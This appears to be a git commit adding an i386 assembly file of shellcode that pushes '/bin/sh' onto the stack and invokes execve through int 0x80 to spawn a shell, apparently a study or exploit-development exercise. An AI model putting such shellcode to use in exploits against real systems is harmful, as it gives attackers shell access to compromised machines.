8134633070325489a967c6b95e23e4f12c7e7e69
BiggieBoo18 <ns182418@gmail.com>
2018-11-27 10:35:57 +0900

    shellcode i386

---
+++ i386/shellcode_i386.asm
@@ -0,0 +1,16 @@
+	global _start
+
+	section .text
+_start:
+	xor	edx,edx		; edx=NULL
+	push	edx		; push NULL
+	mov	eax,0x68732f2f	; eax='//sh'
+	push	eax		; push '//sh'
+	mov	eax,0x6e69622f	; eax='/bin'
+	push	eax		; push '/bin'
+	lea	eax,[edx+11]	; execve syscall no.
+	mov	ebx,esp		; ebx='/bin/sh\0'
+	push	edx		; push NULL
+	push	ebx		; push '/bin/sh/\0'
+	mov	ecx,esp		; ecx=['/bin/sh\0', NULL]
+	int	0x80
